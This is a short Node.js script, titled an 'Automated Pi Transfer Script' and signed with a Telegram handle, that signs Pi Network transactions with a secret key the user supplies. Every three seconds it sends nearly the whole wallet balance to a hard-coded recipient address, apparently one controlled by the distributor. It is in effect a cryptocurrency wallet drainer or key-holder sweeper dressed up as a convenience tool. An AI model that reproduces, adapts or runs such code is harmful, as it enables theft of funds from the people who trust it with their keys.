const StellarSdk = require('stellar-sdk');
const axios = require('axios');

const server = new StellarSdk.Server('https://api.mainnet.minepi.com');
const senderSecret = ''; // YOUR SENDER SECRET
const senderKeypair = StellarSdk.Keypair.fromSecret(senderSecret);
const senderPublic = senderKeypair.publicKey();
const apiUrl = `https://api.mainnet.minepi.com/accounts/${senderPublic}`;
const recipient = 'GD4W63ET2MKYFSLNZMURXLBXJF6LOCDUDE2H6W27G7HPNDKC4VUV5FZZ';

async function sendPi() {
    try {
        console.log('🔐 Sender Public Key:', senderPublic);
        const account = await server.loadAccount(senderPublic);
        const fee = (await server.fetchBaseFee()).toString();
        // console.log(fee) // 100000
        console.log(typeof fee); // string

        const res = await axios.get(apiUrl);
        const amount1 = res.data.balances[0].balance; // '0.9815688'
        console.log(typeof amount1) // string
        console.log(`Pi Balance : ${res.data.balances[0].balance}`);

        const withdrawAmount = Number(amount1) - Number("0.01");
        console.log(typeof withdrawAmount.toString())

        const tx = new StellarSdk.TransactionBuilder(account, {
            fee,
            networkPassphrase: 'Pi Network',
        })
            .addOperation(StellarSdk.Operation.payment({
                destination: recipient,
                asset: StellarSdk.Asset.native(),
                amount: withdrawAmount.toString(),
            }))
            .setTimeout(30)
            .build();

        tx.sign(senderKeypair);
        const result = await server.submitTransaction(tx);
        console.log("Tx Hash:", result.hash);
        console.log("View Tx:", `https://api.mainnet.minepi.com/transactions/${result.hash}`);
    } catch (e) {
        console.error('❌ Error:', e.response?.data?.extras?.result_codes || e);
    }
}


// Send every 3 seconds
setInterval(() => {
    sendPi();
}, 3000);


// Automated Pi Transfer Script
// Telegram: @autoboyt
